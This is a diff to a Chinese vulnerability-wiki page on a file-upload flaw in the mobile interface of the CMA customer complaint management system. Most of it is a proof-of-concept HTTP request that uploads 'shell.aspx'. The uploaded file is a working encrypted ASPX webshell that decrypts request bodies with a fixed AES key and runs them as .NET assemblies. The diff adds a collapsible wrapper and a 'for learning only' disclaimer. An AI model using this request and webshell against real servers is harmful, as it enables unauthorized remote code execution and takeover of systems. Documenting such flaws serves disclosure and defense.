@@ -35,8 +35,10 @@ title="CMA客诉管理系统手机端"
 
 发送请求包上传文件
 
-```
-POST /upFile/upFile.ashx HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /upFile/upFile.ashx HTTP/1.1
 Host: 
 Content-Length: 562
 Cache-Control: max-age=0
@@ -53,10 +55,11 @@ Connection: close
 Content-Disposition: form-data; name="file"; filename="shell.aspx"
 Content-Type: application/octet-stream
 
-<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
+&lt;%@ Page Language="C#" %&gt;&lt;%@Import Namespace="System.Reflection"%&gt;&lt;%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%&gt;
 
-------WebKitFormBoundarymXf9pBIUlDVOYtnZ--
-```
+------WebKitFormBoundarymXf9pBIUlDVOYtnZ--</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241430324.png)
 
